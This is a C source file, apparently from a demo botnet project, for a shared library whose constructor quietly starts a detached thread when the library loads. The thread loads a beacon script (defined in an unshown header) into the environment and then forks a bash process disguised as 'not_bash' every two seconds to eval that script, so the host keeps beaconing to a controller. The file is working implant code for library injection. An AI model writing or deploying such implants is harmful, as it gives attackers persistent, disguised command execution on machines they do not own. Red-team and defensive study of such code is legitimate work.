/*
 * dishonest_soft_cheese_thread.c
 * Injecty curl in a loop
 * By J. Stuart McMurray
 * Created 20251031
 * Last Modified 20251102
 */

#include <err.h>
#include <dlfcn.h>
#include <errno.h>
#include <pthread.h>
#include <stdlib.h>
#include <strings.h>
#include <stdint.h>
#include <time.h>
#include <unistd.h>

#include "beacon.h"

#define INTERVAL  (5) /* Beacon interval in seconds. */
#define SCRIPTVAR "DISHONEST_SOFT_CHEESE_SCRIPT"

/* setenver is setenv(2)'s prototype. */
typedef int(*setenver)(const char *, const char *, int);

/* bot beacons back to our demobotnetcontroller every few seconds. */
static void *
bot(__attribute__((unused)) void *u)
{
        pid_t            ret;
        setenver         real_setenv;
        struct timespec  ts;
        void            *h;

        /* Get the real setenv(2). */
        if (NULL == (h = dlopen("libc.so.6", RTLD_LAZY))) {
                warnx("dlopen: %s", dlerror());
                return NULL;
        }
        if (NULL == (real_setenv = (setenver)(uintptr_t)dlsym(h, "setenv"))) {
                warnx("dlsym: %s", dlerror());
                goto out;
        }

        /* Add our script to the environment, for the children's sake. */
        if (-1 == real_setenv(SCRIPTVAR, BEACON_SH, 1)) {
                warn("setenv");
                goto out;
        }

        /* Beacon every so often. */
        for (;;) {
                /* Fork a child. */
                if (-1 == (ret = fork())) {
                        warn("fork");
                        goto out;
                } else if (0 != ret) {
                        /* Parent, wait a bit and fork another one. */
                        ts = (struct timespec){ .tv_sec = 2 };
                        for (;;) {
                                if (0 == (ret = nanosleep(&ts, &ts))) {
                                        break;
                                } else if (EINTR != errno) {
                                        warn("nanosleep");
                                        goto out;
                                }
                        }
                        continue;
                }
                /* Child, exec a shell to run our script. */
                execl("/bin/bash", "not_bash", "-c",
                                "eval \"$"SCRIPTVAR"\"", NULL);
                err(10, "execl");
        }

out:
        /* Close the library we opened. */
        if (NULL != h && -1 == dlclose(h)) warnx("dlclose: %s", dlerror());

        return NULL;
}

/* ctor starts bot in a detached thread. */
static void __attribute__((constructor))
ctor(void)
{
        pthread_attr_t attr;
        pthread_t      tid;

        bzero(&attr, sizeof(attr));
        bzero(&tid, sizeof(tid));

        /* Start the bot botting in its own thread. */
        if (0 != (errno = pthread_attr_init(&attr)))
                warn("pthread_attr_init");
        else if (0 != (errno = pthread_attr_setdetachstate(&attr,
                                        PTHREAD_CREATE_DETACHED)))
                warn("pthread_attr_setdetachstate");
        else if (0 != (errno = pthread_create(&tid, &attr, bot, NULL)))
                warn("pthread_create");
}
